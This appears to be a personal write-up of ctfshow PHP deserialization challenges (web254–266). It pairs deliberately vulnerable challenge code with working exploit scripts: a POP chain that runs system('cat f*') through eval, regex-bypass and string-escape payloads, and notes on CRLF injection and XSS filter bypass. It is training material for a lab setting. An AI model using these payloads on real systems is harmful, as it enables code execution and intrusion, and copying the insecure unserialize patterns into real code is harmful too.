ctfshow 解题
==

when you tired and suspect yourself , you actually have every right to say fuck you to the world , but do not stop , never.

web 254
-
```php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 
```
payload:/?username=xxxxxx&password=xxxxxx

it just show you how serialize work....if the username and password can through the check , you can get flag.

web 255
-

```php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}


payload
<?php
        class ctfShowUser{
    public $isVip=true;
}
  $s=urlencode(serialize(new ctfShowUser()));
  echo $s;

```
just put the result on the cookie part

web256
-
```php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 

payload:

<?php

class ctfShowUser{
    public $isVip=true;
    public $username='a';
}
echo serialize(new ctfShowUser);
```
![](https://img-blog.csdnimg.cn/20201204094616451.png)


web257
-
```php

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}


payload:
<?php
class ctfShowUser{
    private $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    private $code='system("cat f*");';
}
$b=new ctfShowUser();
echo urlencode(serialize($b));
大致浏览下代码会发现我们可以利用的函数eval，要想调用eval就得使用backDoor类中的getinfo。
然后在ctfShowUser类的__destruct中发现了$this->class->getInfo();，那么我们只需要让$this->class是backDoor类的实例化就可以了。
反序列化时，首先调用__destruct，接着调用$this->class->getInfo();也就是backDoor->getinfo(),最后触发eval。
```
web258
-
```php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}

payload:
正好和O:11:和O:8:匹配上了，绕过的方法就是加上＋，O:+11:,O:+8:即可绕过。
注意一下编码即可：
![](https://img-blog.csdnimg.cn/20210215121406720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
```
web259
-
```php
什么是soap

利用PHP SOAP扩展实现简单Web Services

WebServices能干什么?

WebServices 可以将应用程序转换为网络应用程序。

通过使用WebServices，您的应用程序可以向全世界发布信息，或提供某项功能。

好了，关于WebServices网上资料很多，就不过多介绍了，直接进入主题。

PHP有两个扩展类库可以实现WebServices,一个是NuSoap,一个是php官方自带的Soap扩展，在使用上大致都差不多，就拿官方自带的Soap扩展来说吧。

在Soap编写WebServices中主要用到了SoapClient,SoapServer,SoapFault三个类。

SoapClient：用户访问的类，也就是客户端，使用WebServices的类

SoapServer：提供WebServices类，服务端

SoapFault：异常处理类

什么是uri？与url的区别是什么
从上面的例子来看，你可能觉得URI和URL可能是相同的概念，其实并不是，URI和URL都定义了资源是什么，但URL还定义了该如何访问资源。URL是一种具体的URI，它是URI的一个子集，它不仅唯一标识资源，而且还提供了定位该资源的信息。URI 是一种语义上的抽象概念，可以是绝对的，也可以是相对的，而URL则必须提供足够的信息来定位，是绝对的。
<1>什么是URI

URI，统一资源标志符(Uniform Resource Identifier， URI)，表示的是web上每一种可用的资源，如 HTML文档、图像、视频片段、程序等都由一个URI进行标识的。

<2>URI的结构组成

URI通常由三部分组成：

①资源的命名机制；

②存放资源的主机名；

③资源自身的名称。

（注意：这只是一般URI资源的命名方式，只要是可以唯一标识资源的都被称为URI，上面三条合在一起是URI的充分不必要条件）

<3>URI举例

如：https://blog.csdn.net/qq_32595453/article/details/79516787

我们可以这样解释它：

①这是一个可以通过https协议访问的资源，

②位于主机 blog.csdn.net上，

③通过“/qq_32595453/article/details/79516787”可以对该资源进行唯一标识（注意，这个不一定是完整的路径）

注意：以上三点只不过是对实例的解释，以上三点并不是URI的必要条件，URI只是一种概念，怎样实现无所谓，只要它唯一标识一个资源就可以了。
如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化
crlf顾名思义就是其中的回车和换行，造成的漏洞是HRS漏洞

在http当中http的header和body之间就是两个crlf进行分隔的

HRS漏洞就是如果能控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP response Splitting

HRS漏洞可以造成 固定会话漏洞 和 无视filter的反射型xss漏洞

原理 一般网站会在HTTP头中用Location: http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址，对这个地址进行污染。

HRS漏洞存在的前提是 ：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf，

利用方式：连续使用两次%0d%oa就会造成header和body之间的分离。就可以在其中插入xss代码形成反射型xss漏洞（如何做到无视filiter？）

如何绕过服务端的filiter(xss漏洞)

1，可以在header当中注入另外的字符集<meta charset=ISO-2022-KR>

使用%0f进行标记，之后的字符就不会过滤

2，可以注入一个X-XSS-Protection:0就不会被拦截了

使用一次%0d%0a就可以注入其http header当中的代码比如注入set-cookie信息造成会话固定漏洞
防范方式：在url当中过滤%0a%0d的字符，致使其不能进行转换，或者使其不能进行污染

cookie默认的生命周期在浏览器关闭后就结束了。其可以访问到的域名在创建的域名及其子域下，可以访问到的路径在创建的路径下及其子路径下，可以通过设置属性改变
Set-Cookie响应头是服务器返回的响应头用来在浏览器种cookie，一旦被种下，当浏览器访问符合条件的url地址时，会自动带上这个cookie

Set-Cookie: cookie1=val1; Expires=?; Domain=?; Path=?
Expires
Expires用来设置cookie的过期时间，时间需要符合HTTP-date规范

Date: <day-name>, <day> <month> <year> <hour>:<minute>:<second> GMT
<day-name>: "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", 或 "Sun" 之一 （区分大小写）。
<day>: 2位数字表示天数，例如， "04" 或 "23"。
<month>: "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" 之一（区分大小写）。
<year>: 4位数字表示年份，例如， "1990" 或 "2016"。
<hour>: 2位数字表示小时数，例如， "09" 或 "23"。
<minute>: 2位数字表示分钟数，例如， "04" 或 "59"。
<second>: 2位数字表示秒数，例如， "04" 或 "59"。
GMT: 格林尼治标准时间。
Max-Age
失效时间，单位是秒，低版本浏览器不支持，如果两个都支持，Max-Age优先级比Expires优先级更高

注意：cookie失效前需要的秒数

Domain
指定可以送达cookie允许的域名

Path
Secure
一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。


```
web260
-
```php



```
web261
-
```php



```
web 262
-
```php
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);


message.php  (hint)
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
exp:
<?php
class message{
   public $from;
   public $msg;
   public $to;
   public $token='user';
   public function __construct($f,$m,$t){
       $this->from = $f;
       $this->msg = $m;
       $this->to = $t;
   }
}
$f = 1;
$m = 1;
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';
$msg = new message($f,$m,$t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg ;
echo "\n";
echo base64_encode($umsg);

O:7:"message":4:{s:4:"from";i:1;s:3:"msg";i:1;s:2:"to";s:135:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}
Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iO3M6MTM1OiJsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVUiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6NToidG9rZW4iO3M6NDoidXNlciI7fQ==
```
考点：反序列化字符串逃逸，字符串逃逸我会总结在另一个位置
打完后访问message.php就OK了




web264
-
```php
error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```
和web262里面的payload的一样只不过多设了个cookie
it have no diffierent to web 262,dont forget set up a cookie.




web265
-
```php

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}

exp
<?php
class ctfshowAdmin{
    public $token;
    public $password;
    public function __construct(){
        $this->token='a';
        $this->password =&$this->token;
}
$a=new ctfshowAdmin();
echo serialize($a);

```
考点php地址传参

这个考点在红明谷2021的writeshell中也遇到了

web266
-

```php

highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}

payload

<?php
class ctfshow{
}
$a=new ctfshow();
echo serialize($a);

这个就是改一下ctfshow让他绕过正则匹配，要不然他会抛出一个异常就不能继续进行了，这样就没法触发__destrurt魔术方法。
```
